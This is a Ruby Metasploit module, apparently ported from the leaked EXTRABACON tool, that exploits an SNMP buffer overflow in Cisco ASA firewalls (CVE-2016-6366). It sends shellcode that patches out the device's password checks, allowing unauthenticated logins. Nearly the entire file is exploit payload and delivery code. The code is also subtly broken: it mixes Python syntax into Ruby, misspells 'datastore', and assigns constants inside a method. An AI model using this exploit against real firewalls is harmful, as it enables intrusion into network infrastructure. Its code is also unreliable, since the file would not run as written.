##
# auxiliary/scanner/snmp/cisco_asa_extrabacon?
##


require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Cisco
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Cisco ASA Authentication Bypass (EXTRABACON)',
      'Description' => %q{
          This module patch the authentication functions of a Cisco ASA
          to allow uncredentialed logins.
        },
      'Author'      =>
        [
          'Sean Dillon <sean.dillon@risksense.com>',
          'Zachary Harding <zachary.harding@risksense.com>',
          'Nate Caroe <nate.caroe@risksense.com>',
          'Equation Group',
          'Shadow Brokers'
        ],
      'References' =>
        [
          [ 'CVE', '2016-6366'],
          [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160817-asa-snmp'],
        ],
      'License'     => MSF_LICENSE
    )
    register_options([
      OptEnum.new('MODE', [ true, 'Enable or disable the password auth functions', ['pass-disable', 'pass-enable'], 'pass-disable' ])
    ], self.class)
  end

  def setup
  end

  def cleanup
    # Cleanup is called once for every single thread
  end

  def fw_version_check(vers_string)
    version = vers_string.split(" ").last
    return "#{version}"
  end

  def run_host(ip)

    begin
      lhost = datastore['LHOST'] || Rex::Socket.source_address(ip)
      datastore['VERSION'] = '2c' # 2c required it seems
      mode = datastorep['MODE']

      session = rand(255) + 1

      snmp = connect_snmp

      vers_string = snmp.get_value('1.3.6.1.2.1.47.1.1.1.1.10.1').to_s
      asa_vers = fw_version_check(vers_string)

      JMP_ESP_OFFSET = "29.112.29.8"      # 0x081d701d
      SAFERET_OFFSET = "134.115.39.9"     # 0x09277386
      FIX_EBP        = "72"               # 0x48

      PMCHECK_BOUNDS = "0.128.183.9"      # 0x09b78000
      PMCHECK_OFFSET = "16.128.183.9"     # 0x09b78010
      PMCHECK_CODE   = "85.49.192.137"    # 0x89c03155

      ADMAUTH_BOUNDS = "0.80.8.8"         # 0x08085000
      ADMAUTH_OFFSET = "64.90.8.8"        # 0x08085a40
      ADMAUTH_CODE   = "85.137.229.87"    # 0x57e58955

      PATCHED_CODE   = "49.192.64.195"    # 0xc340c031

      # do we patch, or restore original code
      if mode == 'pass-disable':
          PMCHECK_BYTES = PATCHED_CODE
          ADMAUTH_BYTES = PATCHED_CODE
      else:
          PMCHECK_BYTES = PMCHECK_CODE
          ADMAUTH_BYTES = ADMAUTH_CODE

      preamble_snmp = ""
      preamble_snmp += "49.219.49.246.49.201.49.192.96.49.210.128.197.16.128.194.7.4.125.80.187."
      preamble_snmp += PMCHECK_BOUNDS
      preamble_snmp += ".205.128.88.187."
      preamble_snmp += ADMAUTH_BOUNDS
      preamble_snmp += ".205.128.199.5."
      preamble_snmp += PMCHECK_OFFSET
      preamble_snmp += "."
      preamble_snmp += PMCHECK_BYTES
      preamble_snmp += ".199.5."
      preamble_snmp += ADMAUTH_OFFSET
      preamble_snmp += "."
      preamble_snmp += ADMAUTH_BYTES
      preamble_snmp += ".97.104."
      preamble_snmp += SAFERET_OFFSET
      preamble_snmp += ".128.195.16.191.11.15.15.15.137.229.131.197."
      preamble_snmp += FIX_EBP
      preamble_snmp += ".195"


      #assuming dictionary name is sc...
      #wrapper += ".144" * (82 - wrapper_len)
      #overflow = head + wrapper + ret_addr_snmp + finder_snmp
      #overflow = string.join([head, "95", wrapper, sc.my_ret_addr_snmp, sc.finder_snmp], ".")

      #wrapper = sc[asa_string]["preamble_snmp"]
      wrapper = preamble_snmp

      wrapper_len = wrapper.split('.').length
      wrapper += ".144" * (82 - wrapper_len)

      # cufwUrlfServerStatus
      head = "1.3.6.1.4.1.9.9.491.1.3.3.1.1.5."

      head += "9.95"
      finder_snmp = "139.124.36.20.139.7.255.224.144"

      #overflow = [head, "95", wrapper, sc[asa_string]["my_ret_addr_snmp"], sc[asa_string]["finder_snmp"]].join(".")
      overflow = [head, "95", wrapper, JMP_ESP_OFFSET, finder_snmp].join(".")

      #varbind = SNMP::VarBind.new("#{overflow}" , SNMP::Integer.new(6))
      #value = snmp.set(varbind)
      payload = SNMP::ObjectId.new(overflow)
      response = snmp.get_bulk(0, 1, [payload])
      list = response.varbind_list
      until list.empty?
        data = list.shift
        puts "#{data}"
      end

    # No need to make noise about timeouts
    rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::UnsupportedVersion
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("#{ip} Error: #{e.class} #{e} #{e.backtrace}")
    ensure
      disconnect_snmp
    end
  end

end
